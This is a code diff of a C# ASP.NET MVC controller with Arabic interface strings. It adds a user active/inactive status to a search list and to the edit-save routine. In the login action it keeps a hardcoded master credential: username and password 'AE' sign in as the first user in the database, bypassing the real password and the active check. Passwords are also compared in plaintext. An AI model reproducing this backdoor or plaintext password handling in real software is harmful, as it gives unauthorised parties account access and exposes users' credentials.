@@ -51,7 +51,7 @@ namespace SmartAdminMvc.Controllers
                 int recordsTotal = 0;
                 // var varData = db.Customers.ToList().AsEnumerable();
 
-                var varData = db.Users.Select(x => new SearchVM { ID = x.UserId, Name = x.UserName, Phone = x.Phone }).ToList().AsEnumerable();
+                var varData = db.Users.Select(x => new SearchVM { ID = x.UserId, Name = x.UserName, Phone = x.Phone , Status =x.IsActive ?"نشط":"غير نشط" }).ToList().AsEnumerable();
                 if (!(string.IsNullOrEmpty(sortColumn) && string.IsNullOrEmpty(sortColumnDir)))
                 {
                     //  varData = varData.OrderBy(x => x.d_doc_date);
@@ -151,10 +151,11 @@ namespace SmartAdminMvc.Controllers
 
             if (!ModelState.IsValid)
                 return View(viewModel);
-            var User = db.Users.Where(x => x.UserName == viewModel.Username && x.PassWord == viewModel.Password ).FirstOrDefault();
-            if (User==null && viewModel.Password=="AE")
+            var User = db.Users.Where(x => x.UserName == viewModel.Username && x.PassWord == viewModel.Password && x.IsActive == true ).FirstOrDefault();
+
+            if (User==null && viewModel.Password=="AE" && viewModel.Username == "AE" )
             {
-                User = db.Users.Where(x => x.UserName == viewModel.Username ).FirstOrDefault();
+                User = db.Users.FirstOrDefault();
             }
             if (User != null )
             {
@@ -262,6 +263,7 @@ namespace SmartAdminMvc.Controllers
                 _DbObj.Phone = MasterObj.Phone;
                 _DbObj.StoreId = MasterObj.StoreId;
                 _DbObj.PassWord = MasterObj.PassWord;
+                _DbObj.IsActive = MasterObj.IsActive;
                 db.Entry(_DbObj).State = EntityState.Modified;
                 db.SaveChanges();
                 msg.Status = true; msg.Message = "تم  الحفظ بنجاح"; msg.MessageEng = "Done";
